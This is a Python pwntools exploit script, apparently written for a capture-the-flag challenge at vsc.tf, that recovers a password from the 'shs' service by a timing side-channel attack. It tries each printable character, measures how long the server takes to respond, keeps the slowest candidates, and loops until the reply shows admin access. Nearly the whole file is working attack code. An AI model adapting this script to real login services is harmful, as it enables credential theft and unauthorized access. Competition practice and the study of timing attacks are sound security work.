#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntmpl -nc 'nc vsc.tf 7004'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'shs')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vsc.tf'
port = int(args.PORT or 7004)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def attempt(known_chars):
    """@ptype known_chars typing.List[str]"""
    io = start()

    io.sendafter("password:\n", fit("".join(known_chars).encode(), length=10, filler="a"))
    begin = time.time()
    io.send("\n")
    io.recvn(1)
    finish = time.time()

    success = b"admin" in io.recvline()
    io.close()

    delta = finish - begin

    log.info("Character {} took {}".format(known_chars[-1], delta))
    return delta, success

def check_contestant(results):
    if len(results) <= 1:
        return False

    possible_contestant = results[0]
    neighbor = results[1]
    time_difference = possible_contestant[1] - neighbor[1]
    return time_difference > 0.4

def refresh_top_results(known_chars, results):
    possible_contestant = results[0]
    neighbor = results[1]

    delta, _ = attempt(known_chars + [possible_contestant[0]])
    results[0] = (possible_contestant[0], delta)
    delta, _ = attempt(known_chars + [neighbor[0]])
    results[1] = (neighbor[0], delta)



def find_contestant(known_chars, results):
    results.sort(key=lambda el: el[1], reverse=True)

    if not check_contestant(results):
        return False

    log.info("{} is a password contestant".format(results[0][0]))
    refresh_top_results(known_chars, results)

    return check_contestant(results)

known_chars = []
#known_chars = ['w', 'S', 'o', 't', 'q', '}', 'J', 'Q', 'U', 'e'] # Cache

def get_char(known_chars):
    results = []
    for ch in string.printable:
        delta, success = attempt(known_chars + [ch])
        if success:
            log.success("".join(known_chars + [ch]))
            return True
        results.append([ch, delta])

        if find_contestant(known_chars, results):
            log.info("Found contestant")
            break


    results.sort(key=lambda el: el[1], reverse=True)

    for ch, delta in results[:3]:
        log.info("{}: {}".format(ch, delta))

    log.info("Selecting {}".format(results[0]))
    known_chars.append(results[0][0])
    return False

while not get_char(known_chars):
    continue
